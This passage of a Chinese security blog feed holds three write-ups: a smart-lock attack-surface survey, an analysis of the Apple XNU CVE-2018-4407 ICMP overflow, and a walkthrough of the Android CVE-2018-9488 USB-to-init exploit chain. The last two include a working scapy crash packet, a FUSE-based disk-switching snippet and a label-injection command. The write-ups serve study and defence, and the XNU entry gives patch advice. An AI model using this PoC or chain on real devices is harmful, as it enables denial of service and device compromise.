title="漏洞案例"></a>漏洞案例</h6><ol><li>华马智能门锁存在硬件漏洞（无线重放） <a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02695" target="_blank" rel="noopener">http://www.cnvd.org.cn/flaw/show/CNVD-2018-02695</a> </li><li>微耕遥控智能锁系统存在设计漏洞（wifi重放） <a href="http://www.cnvd.org.cn/flaw/show/CNVD-2016-12586" target="_blank" rel="noopener">http://www.cnvd.org.cn/flaw/show/CNVD-2016-12586</a></li></ol><h5 id="5-手机APP或小程序开锁"><a href="#5-手机APP或小程序开锁" class="headerlink" title="5.手机APP或小程序开锁"></a>5.手机APP或小程序开锁</h5><h6 id="实现机制-3"><a href="#实现机制-3" class="headerlink" title="实现机制"></a>实现机制</h6><p>在初始化的过程中，云端会将门锁与指定手机上的APP进行绑定。在用户开锁时，用户在手机APP上完成身份认证，然后在手机上点击开锁按钮，智能门锁就会接收到云端下发的开锁指令，然后打开门锁。</p><h6 id="攻击面-4"><a href="#攻击面-4" class="headerlink" title="攻击面"></a>攻击面</h6><p>APP漏洞、重放攻击</p><h6 id="漏洞案例-4"><a href="#漏洞案例-4" class="headerlink" title="漏洞案例"></a>漏洞案例</h6><h5 id="6-近场通信开锁"><a href="#6-近场通信开锁" class="headerlink" title="6.近场通信开锁"></a>6.近场通信开锁</h5><h6 id="实现机制-4"><a href="#实现机制-4" class="headerlink" title="实现机制"></a>实现机制</h6><p>WIFI、NB-IoT、ZigBee、蓝牙等通信方式的攻击</p><h6 id="攻击面-5"><a href="#攻击面-5" class="headerlink" title="攻击面"></a>攻击面</h6><p>信号重放、短距离内挟持、靠近时自动开锁</p><h6 id="漏洞案例-5"><a href="#漏洞案例-5" class="headerlink" title="漏洞案例"></a>漏洞案例</h6><h4 id="三、通用性攻击面"><a href="#三、通用性攻击面" class="headerlink" title="三、通用性攻击面"></a>三、通用性攻击面</h4><h5 id="1-无线馈电攻击"><a href="#1-无线馈电攻击" class="headerlink" title="1.无线馈电攻击"></a>1.无线馈电攻击</h5><p><img src="/images/pasted-171.png" alt="upload successful"><br>一些智能门锁由于设计缺陷，在布线及电路设计时没有考虑电磁干扰问题。攻击者可以利用特斯拉线圈通过无线电波干扰，使得智能门锁的内部电路产生直流馈电，可能产生两种效果：</p><ul><li>利用智能门锁电路的馈电系统驱动电流打开门锁</li><li>产生强电磁脉冲攻击智能门锁芯片，会造成芯片死机并重启，有的智能门锁默认重启后会自动开锁</li></ul><p>漏洞案例：</p><ol><li>参考一篇文章《那个女人毁了整个指纹锁行业》</li></ol><h5 id="2-APP或小程序逻辑漏洞"><a href="#2-APP或小程序逻辑漏洞" class="headerlink" title="2.APP或小程序逻辑漏洞"></a>2.APP或小程序逻辑漏洞</h5><p>绝大多数只能门锁厂商都会开发对于的APP或小程序，由于这些厂商非软件产商，更多的会专注于功能实现，而忽略了安全性。可能存在的风险有：</p><ul><li>APP代码中或者固件中使用固定的加解密密钥</li><li>本地逻辑绕过开锁</li><li>移动端APP和设备之间的认证漏洞</li><li>明文传输</li></ul><p>漏洞案例</p><ol><li>松下智能锁安卓App存在任意密码重置漏洞 <a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-03908" target="_blank" rel="noopener">http://www.cnvd.org.cn/flaw/show/CNVD-2017-03908</a></li><li>某智能门锁二度分析感悟 <a href="https://paper.seebug.org/343/" target="_blank" rel="noopener">https://paper.seebug.org/343/</a></li></ol><h5 id="3-云端漏洞"><a href="#3-云端漏洞" class="headerlink" title="3.云端漏洞"></a>3.云端漏洞</h5><ul><li><p>用户身份鉴别漏洞</p><ul><li>未限制密码复杂度</li><li>未限制非法登陆次数</li><li>重置密码的短信验证码由本地产生或者存在于返回数据包中</li></ul></li><li><p>访问控制漏洞</p><ul><li>横向越权</li><li>纵向越权</li></ul></li><li><p>云管理平台系统存在web漏洞</p></li></ul><p>常见的web安全漏洞同样存在于智能门锁云管理平台，例如，SQL注入、任意文件上传、失效的身份验证和回话管理、跨站脚本攻击、不安全的直接对象引用、安全配置错误、敏感信息泄露、功能级访问控制缺失、跨站请求伪造、使用含有已经存在漏洞的组件和未验证的重定向和转发等漏洞。</p><h5 id="4-固件漏洞"><a href="#4-固件漏洞" class="headerlink" title="4.固件漏洞"></a>4.固件漏洞</h5><ul><li>固件提取、逆向分析</li><li>固件未签名，中间人攻击更新</li></ul><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ol><li>CNCERT：智能门锁网络安全分析报告 <a href="https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA%3D%3D&amp;mid=2247486313&amp;idx=1&amp;sn=adf4560cfceca1e996cbf173e5bb415f&amp;scene=45#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA%3D%3D&amp;mid=2247486313&amp;idx=1&amp;sn=adf4560cfceca1e996cbf173e5bb415f&amp;scene=45#wechat_redirect</a></li><li>Smart Locks: Lessons for Securing Commodity Internet of Things Devices <a href="https://www2.eecs.berkeley.edu/Pubs/TechRpts/2016/EECS-2016-11.pdf" target="_blank" rel="noopener">https://www2.eecs.berkeley.edu/Pubs/TechRpts/2016/EECS-2016-11.pdf</a></li><li>智能锁安全漏洞自查手册 <a href="http://www.pieeco.com/news/3023_1.html" target="_blank" rel="noopener">http://www.pieeco.com/news/3023_1.html</a></li><li>如何通过手机搞定蓝牙门锁 <a href="https://www.anquanke.com/post/id/87128" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87128</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>远程打挂所有的apple设备 — CVE-2018-4407分析</title>
      <link href="/2018/11/01/%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90/"/>
      <url>/2018/11/01/%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p><a href="https://twitter.com/kevin_backhouse/status/1057352656560287746" target="_blank" rel="noopener">Kevin Backhouse</a> 发现了一个iOS和mac OS的内核漏洞 —— CVE-2018-4407，该漏洞出现在XNU内核中，可以远程攻击使所有的apple设备挂掉。</p><p>漏洞演示demo：<a href="https://www.youtube.com/watch?v=aV7yEemjexk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=aV7yEemjexk</a></p><p>漏洞已经上报给了Apple并在iOS12（9月17日）和macOS Mojave（9月24日）系统更新中已经修复完成。该漏洞影响以下版本的设备：</p><ul><li>iOS 11以及之前的所有设备 (upgrade to iOS 12)</li><li>macOS High Sierra 10.13.6以及以下所有设备(patched in security update 2018-001)</li><li>macOS Sierra 10.12.6以及之前所有的设备(patched in security update 2018-005)</li><li>OS X El Capitan以及之前所有设备</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在icmp_error代码中, (<a href="https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_icmp.c#L339" target="_blank" rel="noopener">bsd/netinet/ip_icmp.c:339</a>):</p><p>我们知道，ICMP报文主要有两大功能：查询报文和差错报文。在互联网传输过程中，IP数据报难免会出现差错，通常出现差错时处理方法就是丢弃，但一般出现差错后，接收方会发送ICMP报文给主机，告诉它一些差错信息，而icmp_error就是这一部分的实现。</p><p>产生漏洞的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip);</span><br></pre></td></tr></table></figure></p><p>m_copydata为一个简单的指定长度的数据拷贝，其实现如下：<br><img src="/images/pasted-156.png" alt="upload successful"></p><p>icmp_error中的m_copydata是将出错ip数据包的包头复制到icmp的消息体中，其中n为接收到的出错的ip数据包，icp-&gt;icmp_ip为要拷贝的目的地址，如果n的包头过大，超过了icp分配的长度，则会发生溢出。</p><p>下面来跟踪一下icp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icp = mtod(m, struct icmp *);</span><br></pre></td></tr></table></figure><p>mtod是一个<a href="https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/sys/mbuf.h#L136" target="_blank" rel="noopener">宏定义</a>, 意思是将一个mbuf指针转为对应类型的指针，由此可见这里icp是一个icmp结构体指针</p><p><img src="/images/pasted-155.png" alt="upload successful"></p><p>继续跟踪m:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct mbuf *m;</span><br><span class="line">...</span><br><span class="line">icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len));</span><br><span class="line"></span><br><span class="line">if (MHLEN &gt; (sizeof(struct ip) + ICMP_MINLEN + icmplen))</span><br><span class="line">m = m_gethdr(M_DONTWAIT, MT_HEADER);/* MAC-OK */</span><br><span class="line">else</span><br><span class="line">m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR);</span><br></pre></td></tr></table></figure></p><p>由此可见m为要发出去的数据包，它的大小由m_gethdr或m_getcl来分配。</p><p>此时，再回过头来看一下m_copydata:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip);</span><br></pre></td></tr></table></figure></p><p>如上文所述，n指向接收到的数据包，icp指向一个icmp结构体，是由出站数据包m转换过来，icp-&gt;icmp_ip为icp+8字节偏移。如果icmplen的长度过大，就会出现溢出。</p><p>icmplen的赋值代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (oip-&gt;ip_p == IPPROTO_TCP) &#123;</span><br><span class="line">struct tcphdr *th;</span><br><span class="line">u_int16_t tcphlen;</span><br><span class="line"></span><br><span class="line">if (oiphlen + sizeof(struct tcphdr) &gt; n-&gt;m_len &amp;&amp;</span><br><span class="line">    n-&gt;m_next == NULL)</span><br><span class="line">goto stdreply;</span><br><span class="line"></span><br><span class="line">th = (struct tcphdr *)(void *)((caddr_t)oip + oiphlen);</span><br><span class="line"></span><br><span class="line">tcphlen = th-&gt;th_off &lt;&lt; 2;</span><br><span class="line"></span><br><span class="line">if ((oiphlen + tcphlen) &gt; n-&gt;m_len &amp;&amp; n-&gt;m_next == NULL)</span><br><span class="line">goto stdreply;</span><br><span class="line"></span><br><span class="line">icmpelen = max(tcphlen, min(icmp_datalen,</span><br><span class="line">    (oip-&gt;ip_len - oiphlen)));</span><br><span class="line">&#125; </span><br><span class="line">else</span><br><span class="line">stdreply:icmpelen = max(ICMP_MINLEN, min(icmp_datalen,</span><br><span class="line">    (oip-&gt;ip_len - oiphlen)));</span><br><span class="line"></span><br><span class="line">icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len));</span><br></pre></td></tr></table></figure></p><p>经过作者测试，icmplen大于等于84即可发生溢出，另外由于代码执行到这里需要满足oip-&gt;ip_p == IPPROTO_TCP，因此我们需要构造一个IP+TCP的数据包，并且长度大于84即可。</p><p>讲到这里，要怼一下某些带“Ping死你！”的翻译文章标题，漏洞的原理是:接收方收到一个畸形tcp包后，会生成一个ICMP包告知发送方出错，溢出出现在生成ICMP包的逻辑中，并不是由ping导致，所以“ping死你”明显是标题党啊。。。</p><p>PoC如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo scapy</span><br><span class="line">&gt;&gt;send(IP(dst=&quot;192.168.1.151&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=8888,options=[(19, &quot;1&quot;*33)]))</span><br></pre></td></tr></table></figure></p><h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>由于该漏洞只需要在同一个局域网内就可以远程攻击，因此杀伤力巨大。除了星巴克等公共wifi可作为攻击环境外，用SIM卡上网的手机本质上也处在一个巨大的局域网中，都有可能被远程攻击，因此有必要对自己的设备进行防护，升级到最新的系统。</p><p>mac如不想升级系统，可在设置- 安全性与隐私 - 防火墙选项中，启用隐身模式，如下图：</p><p><img src="/images/pasted-157.png" alt="upload successful"></p><p>iOS设备无法通过类似方式防御，只能更新到最新系统。</p><p>参考资料：</p><ol><li><a href="https://twitter.com/kevin_backhouse/status/1057352656560287746" target="_blank" rel="noopener">https://twitter.com/kevin_backhouse/status/1057352656560287746</a></li><li><a href="https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407" target="_blank" rel="noopener">https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CVE-2018-9488 - 从zygote到init</title>
      <link href="/2018/09/17/USB%E6%94%BB%E5%87%BBandroid%E6%89%8B%E6%9C%BA/"/>
      <url>/2018/09/17/USB%E6%94%BB%E5%87%BBandroid%E6%89%8B%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>上一篇文章中利用cve-2018-9445实现了Android系统在mount外设时的目录穿越<a href="./CVE-2018-9445 —— Android挂载外设的目录穿越">CVE-2018-9445 —— Android挂载外设的目录穿越</a>，由于字符长度限制，只有5个字符可控，利用极其有限。</p><p>PJ0的Jann Horn，也就是漏洞的原作者对该漏洞进一步分析，发现了更精巧的利用方法，能够基于该漏洞进一步从zygote提权到init，Goole为这一新的利用分配了<br>新的cve编号 —— CVE-2018-9488。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>cve-2018-9445能够利用的前提是USB设备有MBR分区表，且格式为vfat，这样内核的vfat文件系统才会mount。此外，如需进一步利用，还需要绕过以下几种安全措施：</p><ul><li>路径穿越5个字符的限制</li><li>SELinux限制了vold进程的操作</li><li>权限限制，如果目录权限不是0700，fs_prepare_dir和chmod会失败</li><li>vfat文件系统限制。vfat格式的U盘被mount后，所有文件会被标记为u:object_r:vfat:s0，这意味着即使mount后的目录为/system或/data等一些系统级别的目录，SELinux Context下的进程（如zygote和system_server）是无法和其交互的。</li><li>media_rw组的进程需要绕过DAC检测</li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="1-伪造一个USB设备"><a href="#1-伪造一个USB设备" class="headerlink" title="1.伪造一个USB设备"></a>1.伪造一个USB设备</h2><p>如上篇文章所述，blkid支持各种不同的文件系统，在解析文件头得到type, label和 UUID之后，fsck_msdos会再次读取文件，检测文件系统是否为vfat格式，我们只需要构造一个动态可控的USB设备使系统在两次读取信息时，返回不同的值即可满足这两种条件。即blkid在读取时，构造一个长字符串的label,使blkid认为是romfs格式；fsck_msdos在读取时，再修改自己成为一个vfat格式的USB设备。</p><p>这里使用一个树莓派Zero W去构造一个USB Gadget实现上述功能，USB Gadget实现了 USB 协议定义的设备端的软件功能，Linux 中一切皆文件，因此通过配置一些参数如设备类型，序列号等，就可以被操作系统识别为一个“真实的”USB设备。参考<a href="https://events.static.linuxfound.org/sites/events/files/slides/LinuxConNA-Make-your-own-USB-gadget-Andrzej.Pietrasiewicz.pdf" target="_blank" rel="noopener">Make your own USB gadget”</a>。</p><p>注意之所以使用Zero W是因为其支持USB device模式，Zero W有两个MicroUSB接口，分别用来供电和传输数据，市面上稍早些的树莓派，比如树莓派2B，树莓派3等，它们都只支持作为 Host。<br><img src="/images/pasted-145.png" alt="upload successful"></p><p>为了实现目的，我们使用FUSE来实现辅助构造一个USB设备。 FUSE即用户空间文件系统（Filesystem in Userspace），通过FUSE可以修改文件系统读取属性，以实现不同条件下的读取返回不同的内容，核心代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static int readdir(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) &#123;</span><br><span class="line">backing_fds[STATE_BLKID] = open(&quot;disk_image_blkid&quot;, O_RDWR);</span><br><span class="line">backing_fds[STATE_MOUNT] = open(&quot;disk_image_mount&quot;, O_RDWR);</span><br><span class="line">if (offset == 0 &amp;&amp; size == 0x1000) switch_to_fd_idx(STATE_BLKID);</span><br><span class="line">if (offset == 0x0011e000 &amp;&amp; size == 0x2000) switch_to_fd_idx(STATE_MOUNT);</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里构造了两个image,第一个imgae为romfs格式，这里命名为”disk_image_blkid”，通过命令修改其label值以触发漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo -e &apos;-rom1fs-########TYPE=&quot;vfat&quot; UUID=&quot;../../data&quot;\0&apos; &gt; /dev/sdd1</span><br></pre></td></tr></table></figure></p><p>第二个image为vfat格式，这里命名为”disk_image_mount”，放入需要替换的文件。</p><p>编译fuse_intercept.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall fuse_intercept.c `pkg-config fuse --cflags --libs` -o fuse_intercept</span><br></pre></td></tr></table></figure></p><p>新建一个目录”mount”，并在控制台中运行fuse_intercept。</p><p>在另一个控制台运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe dwc2</span><br><span class="line">sudo modprobe g_mass_storage file=/home/pi/mount/wrapped_image stall=0</span><br></pre></td></tr></table></figure></p><p>告诉内核将mount目录作为一个usb设备。</p><h2 id="2-绕过SELinux"><a href="#2-绕过SELinux" class="headerlink" title="2.绕过SELinux"></a>2.绕过SELinux</h2><p>即使成功的利用漏洞monut到了/data目录，由于Android的一些安全限制，很多代码是无法访问mount的文件系统的。</p><p>基于Android的访问限制，代码访问mount文件系统需要绕过DAC和SELinux两种限制:</p><ul><li>DAC (默认mount的文件属性为media_rw组)</li></ul><p><img src="/images/pasted-146.png" alt="upload successful"></p><ul><li>SELinux （zygote和system_server中的代码无权限加载mount的文件，所有文件为u:object_r:vfat:s0）</li></ul><p><img src="/images/pasted-148.png" alt="upload successful"></p><p>事实上我们挂载的vfat文件系统由于是被动挂载，无法修改文件属性和绕过SELinux限制，利用上述的目录穿越漏洞，除了覆盖一些文件外，是无法实现代码执行的。</p><p>为了实现代码执行，必须切换一下思路。我们知道Android(Linux)的分区是通过mount实现的，既然我们mount的文件无法绕过DAC和SELinux，那么系统mount的文件是如何实现的呢？这就引出了一个新的利用思路：PrivateVolume。</p><p>Android系统的vold支持两种形式的USB —— PublicVolume和PrivateVolume(也就是外部存储和内部存储)，之前的漏洞利用我们一直基于PublicVolume，然而vold还可以挂载为PrivateVolume。PrivateVolume有一个很重要的特点就是可以控制文件的SELinux标签，这是因为PrivateVolume属于ext4文件格式，而ext4是支持修改SELinux的。因此如果能挂载为PrivateVolume，我们就可以绕过SELinux检测，进而实现代码执行。</p><p>挂载成为PrivateVolume需要一些条件：PrivateVolume是由dm-crypt-encrypted加密的ext4文件系统，PrivateVolume必须为GPT分区格式，且包含一个独特的UUID kGptAndroidExpand (193D1EA4-B3CA-11E4-B075-10604B889DCF)。key保存在/data/misc/vold/expand_{partGuid}.key这个路径，其中{partGuid}为GPT分区的GUID。</p><p>正常情况下攻击者不可能挂载一个PrivateVolume，因为手机上没有这个key,即使有，我们也不知道具体的GUID。但是攻击者可以利用之前的目录穿越漏洞覆盖/data/misc 目录，把自己的key和GUID预置在那里。</p><p>这里有人可能会质疑，这个key文件难道没有SELinux限制么？这是因为挂载是由vold进程实现的，正如本节开头所述，vold进程是用来处理mount事件的，因此vold是有权限访问的。</p><p>本节通过挂载成为PrivateVolume，我们可以绕过DAC和SELinux限制，进而实现代码执行。</p><h2 id="3-注入Zygote"><a href="#3-注入Zygote" class="headerlink" title="3.注入Zygote"></a>3.注入Zygote</h2><p>绕过了DAC和SELinux限制，那么如何实现代码执行呢？通过利用漏洞覆盖/data,我们可以替换一些高权限进程加载的第三方库，进而注入我们自己的代码。</p><p>zygote进程具有很高的权限，可以任意修改自己的UID和context,几乎可以访问所有的user数据。zygote在启动时，会加载/data/dalvik-cache/arm64/system@framework@boot*.{art,oat,vdex}三个文件，其中oat和vdex为/system分区的软连接，oat为一个elf文件。</p><p>我们在mount到/data目录时，为保证zygote运行，需要准备这3个文件，其中oat和vdex直接设置为对应的软连接即可，对于oat文件，在<strong>attribute</strong>((constructor))函数中注入我们的代码，这样只要dlopen()加载oat文件时便会执行我们的代码。</p><p>到目前为止我们实现了Zygote进程的代码执行，但只是理论上实现，因为Zygote只要在启动时才会加载这些第三方库，而我们的漏洞在触发时，Zygote已经运行起来了，因此我们需要让Zygote再加载一次。</p><h2 id="4-Crash-system-server"><a href="#4-Crash-system-server" class="headerlink" title="4.Crash system_server"></a>4.Crash system_server</h2><p>为了实现Zygote重新加载一次，重启手机显然是不行的，Zygote倒是重新加载了，但vold进程也会重启，意味着我们漏洞利用也重新来过。因此只能采取软重启，但又保持vold进程不变的方式，来重启Zygote进程。</p><p>Android中有一段用来跟踪宽带占用的代码，这段代码会不断的向/data分区写入数据，但超过2M的数据（mPersistThresholdBytes）写入失败时，就会导致system_server重启，也就意味着Zygote会重启。</p><p>利用这个逻辑，我们可以使用Ping flood来触发Zygote重启。</p><p>使用Ping flood需要基于一个前提，即被攻击设备连接到我们控制的网络中，这有两种办法可以实现：</p><ul><li>Android 9.0之前，在锁屏界面是可以控制手机连接到一个无需密码的wifi，以Pixel为例，只需要下滑屏幕，点击wifi图标下的小三角即可选择要连接的wifi。</li><li>在手机上插一个USB无线网卡</li></ul><p>上述两种办法都可以实现利用Ping flood来crash system_server。</p><p>到目前为止，我们漏洞利用做到了Zygote下的代码执行，Android中的应用都是由Zygote进程孵化而来，因此目前的漏洞利用代码可以访问所有的用户数据，但zygote毕竟权限有限，如不能打开一些块设备文件、访问部分内存空间受限等等，为了扩大化攻击，我们需要进一步提权。</p><h2 id="5-从zygote到vold"><a href="#5-从zygote到vold" class="headerlink" title="5.从zygote到vold"></a>5.从zygote到vold</h2><p>早期的Android通过一个高权限的守护进程来生成crash dump文件，现在的andorid采用/system/bin/crash_dump64和/system/bin/crash_dump32来生成crash dump文件，这两个文件的SELinux标签为u:object_r:crash_dump_exec:s0，当这个标签的文件任何SELinux domain执行时，其context都会变为crash_dump domain。</p><p>crash_dump 的SELinux策略如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://android.googlesource.com/platform/system/sepolicy/+/a3b3bdbb2fdbb4c540ef4e6c3ba77f5723ccf46d/public/crash_dump.te:</span><br><span class="line">[...]</span><br><span class="line">allow crash_dump &#123;</span><br><span class="line"> domain</span><br><span class="line"> -init</span><br><span class="line"> -crash_dump</span><br><span class="line"> -keystore</span><br><span class="line"> -logd</span><br><span class="line">&#125;:process &#123; ptrace signal sigchld sigstop sigkill &#125;;</span><br><span class="line">[...]</span><br><span class="line">r_dir_file(crash_dump, domain)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></p><p>这个策略允许crash_dump通过ptrace去attach绝大多数其他进程，包括vold进程，因此如果我们在crash_dump context下就可以通过attach拿到了vold进程权限。</p><p>到这里也许我们想把一个预置一个带u:object_r:crash_dump_exec:s0标签的文件，然后去执行它，进而转移到crash_dump domain，然而这是行不通的。这是因为vold在mount时对文件做了权限降级，无法实现SELinux domain transitions。</p><p>因此，现在只能通过注入代码到crash_dump64，我们使用unshare（）创建一个新的挂载点，然后调用pivot_root（）将根目录指向一个我们完全可控的目录，之后再执行crash_dump64。这样kernel会解析crash_dump64的文件头，获取linker的路径(/system/bin/linker64)，并从这个路劲加载linker并执行，如果这个linker是我们自己实现的，这个过程就会执行我们的代码。之后，我们的代码再通过attach到vold进程，拿到vold进程的执行权限。</p><h2 id="6-从vold到init-context"><a href="#6-从vold到init-context" class="headerlink" title="6.从vold到init context"></a>6.从vold到init context</h2><p>到这里为止我们已经通过attach的方式控制了vold进程，作者又从vold提权到init context,注意这里是context，并非init进程。通过查找代码中所有能转为init contect的SELinux策略，发现kernel context可以转为init context:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://android.googlesource.com/platform/system/sepolicy/+/master/private/kernel.te:</span><br><span class="line">domain_auto_trans(kernel, init_exec, init)</span><br></pre></td></tr></table></figure></p><p>这意味着如过kernel context的代码执行一个带有init_exec标签的文件，这个文件的context将变为init context。</p><p>运行在kernel context的代码只能是kernel层了，即我们需要想办法让kernel执行一个带init_exec的文件。作者进一步发现当查找一个不存在的key时（例如调用request_key()），/sbin/request-key文件将会被kernel调用，所以利用之前的漏洞，我们替换/sbin目录，并预置我们自己构造的request-key，在获得vold执行权限后，调用request_key(),这时候kernel会调起我们构造的request-key，进而变为init context。</p><h2 id="7-从init-context到kernel"><a href="#7-从init-context到kernel" class="headerlink" title="7.从init context到kernel"></a>7.从init context到kernel</h2><p>理论上从init context还可以进一步提权到kernel权限，但作者到这一步便没有再进行研究。</p><p>通过查找源码中的domain_trans，发现init context可以转为modprobe或vendor_modprobe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">domain_trans(init, &#123; rootfs toolbox_exec &#125;, modprobe)</span><br><span class="line">domain_trans(init, vendor_toolbox_exec, vendor_modprobe)</span><br></pre></td></tr></table></figure></p><p>modprobe或vendor_modprobe有加载kernel module的权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow modprobe self:capability sys_module;</span><br><span class="line">allow modprobe &#123; system_file &#125;:system module_load;</span><br><span class="line">allow vendor_modprobe self:capability sys_module;</span><br><span class="line">allow vendor_modprobe &#123; vendor_file &#125;:system module_load;</span><br></pre></td></tr></table></figure></p><p>Android目前对kernel modules的加载还没有签名验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">walleye:/ # zcat /proc/config.gz | grep MODULE</span><br><span class="line">CONFIG_MODULES_USE_ELF_RELA=y</span><br><span class="line">CONFIG_MODULES=y</span><br><span class="line"># CONFIG_MODULE_FORCE_LOAD is not set</span><br><span class="line">CONFIG_MODULE_UNLOAD=y</span><br><span class="line">CONFIG_MODULE_FORCE_UNLOAD=y</span><br><span class="line">CONFIG_MODULE_SRCVERSION_ALL=y</span><br><span class="line"># CONFIG_MODULE_SIG is not set</span><br><span class="line"># CONFIG_MODULE_COMPRESS is not set</span><br><span class="line">CONFIG_MODULES_TREE_LOOKUP=y</span><br><span class="line">CONFIG_ARM64_MODULE_CMODEL_LARGE=y</span><br><span class="line">CONFIG_ARM64_MODULE_PLTS=y</span><br><span class="line">CONFIG_RANDOMIZE_MODULE_REGION_FULL=y</span><br><span class="line">CONFIG_DEBUG_SET_MODULE_RONX=y</span><br></pre></td></tr></table></figure></p><p>因此，在init context下执行一个文件变为modprobe context，进而加载一个kernel module可以提权到kernel权限。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这套利用可谓是极其精巧，把一个简单的目录穿越变为了kernel下的代码执行。我总结了漏洞利用过程中几个关键的节点，如下图：</p><p><img src="/images/pasted-149.png" alt="upload successful"></p><p>完成这套利用需要对Android的文件系统、DAC和SELinux有很深的理解，每一个关键环节都能看出作者扎实的基础和功底，是我们学习的榜样！</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://googleprojectzero.blogspot.com/2018/09/oatmeal-on-universal-cereal-bus.html" target="_blank" 